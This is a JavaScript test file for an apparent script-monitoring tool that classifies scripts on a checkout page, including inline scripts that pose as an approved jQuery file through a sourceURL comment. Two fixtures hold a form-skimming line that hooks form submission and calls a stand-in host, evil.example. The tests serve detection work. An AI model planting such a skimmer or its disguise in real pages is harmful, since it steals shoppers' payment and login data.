import { test } from 'node:test';
import assert from 'node:assert/strict';
import { buildScripts } from '../../src/capture/scripts.js';
import { templateOf } from '../../src/analyze/template.js';
import { sha256Hex } from '../../src/util/hash.js';

const PAGE = 'https://shop.example/checkout';
const JQ = 'https://code.jquery.example/jquery-3.7.1.min.js';
const JQ_SOURCE = '/*! jQuery v3.7.1 */ (function(){ window.jQuery = 1; })();';

// What Chrome reported for one visit: parsed scripts (with their source) and the network requests.
async function build({ parsed, requests = [], docUrls = [PAGE] }) {
  const sources = new Map(parsed.map((p) => [p.scriptId, p.source]));
  const bodies = new Map(requests.map((r) => [r.requestId, r.body]));
  const ctx = {
    async send(method, params) {
      if (method === 'Debugger.getScriptSource') return { scriptSource: sources.get(params.scriptId) };
      if (method === 'Network.getResponseBody') return { body: bodies.get(params.requestId), base64Encoded: false };
      throw new Error(method);
    },
  };
  const scriptLog = { parsed: parsed.map((p, i) => ({ sessionId: 's', v8Hash: `h${i}`, length: p.source.length, stack: null, frameId: 'f', wasm: false, module: false, sourceURL: false, ...p })) };
  const netLog = {
    scriptRequest: (url) => requests.find((r) => r.url === url && r.type === 'Script') ?? null,
    scriptRequests: () => requests.filter((r) => r.type === 'Script'),
    documentUrls: () => new Set(requests.filter((r) => r.type === 'Document').map((r) => r.url)),
  };
  const cache = { sources: new Map(), bodies: new Map(), analysis: new Map() };
  const { scripts } = await buildScripts(ctx, scriptLog, netLog, { frameOf: () => 'top', docUrls: new Map([['s', new Set(docUrls)]]), isTracked: () => true, cache });
  return scripts;
}

test('an inline script that names itself after an approved file with sourceURL is judged as inline code', async () => {
  const skim = 'document.forms[0].onsubmit = () => fetch("https://evil.example/c");\n//# sourceURL=' + JQ;
  const [s] = await build({
    parsed: [{ scriptId: '1', url: JQ, sourceURL: true, source: skim }],
    requests: [{ requestId: 'r1', url: JQ, type: 'Script', body: JQ_SOURCE }],
  });
  assert.equal(s.kind, 'inline');
  assert.equal(s.ref.url, null);
  assert.equal(s.ref.template, templateOf(skim).hash);
});

test('a file that names itself after its own URL keeps that URL', async () => {
  const source = `${JQ_SOURCE}\n//# sourceURL=${JQ}`;
  const [s] = await build({
    parsed: [{ scriptId: '1', url: JQ, sourceURL: true, source }],
    requests: [{ requestId: 'r1', url: JQ, type: 'Script', body: source }],
  });
  assert.equal(s.kind, 'external');
  assert.equal(s.ref.url, JQ);
  assert.equal(s.ref.contentHash, sha256Hex(Buffer.from(source)));
});

test('a sourceURL that is not a web address does not stop the visit', async () => {
  const [s] = await build({ parsed: [{ scriptId: '1', url: 'webpack://app/src/x.js', sourceURL: true, source: 'x();' }] });
  assert.equal(s.kind, 'inline');
  const [t] = await build({ parsed: [{ scriptId: '1', url: 'x', sourceURL: true, source: 'y();' }] });
  assert.equal(t.kind, 'inline');
});

test('an inline script is still inline after the page changed its address with history.pushState', async () => {
  const [s] = await build({
    parsed: [{ scriptId: '1', url: PAGE, source: 'var step = 1;' }],
    requests: [{ requestId: 'd1', url: PAGE, type: 'Document', body: '<html>' }],
    docUrls: [`${PAGE}?step=2`],
  });
  assert.equal(s.kind, 'inline');
});

test('a fetched file that gives itself another name keeps the address it was fetched from', async () => {
  const source = 'document.forms[0].onsubmit = () => fetch("https://evil.example/c");\n//# sourceURL=x';
  const [s] = await build({
    parsed: [{ scriptId: '1', url: 'x', sourceURL: true, source }],
    requests: [{ requestId: 'r1', url: 'https://evil.example/skim.js', type: 'Script', body: source }],
  });
  assert.equal(s.kind, 'external');
  assert.equal(s.ref.url, 'https://evil.example/skim.js');
});
